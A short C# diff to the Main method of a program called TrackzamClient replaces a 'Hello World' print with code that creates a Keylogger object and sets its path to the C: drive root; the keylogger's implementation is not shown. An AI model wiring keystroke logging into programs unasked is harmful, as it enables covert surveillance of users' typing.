@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Runtime.InteropServices;
 
 namespace TrackzamClient
 {
@@ -7,9 +6,10 @@ namespace TrackzamClient
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("Hello World!");
-            Console.WriteLine(RuntimeInformation.FrameworkDescription);
-
+            // TODO delete later
+            //Console.WriteLine(RuntimeInformation.FrameworkDescription);
+            Keylogger k = new Keylogger();
+            k.setPath(@"C:\\");
         }
     }
 }
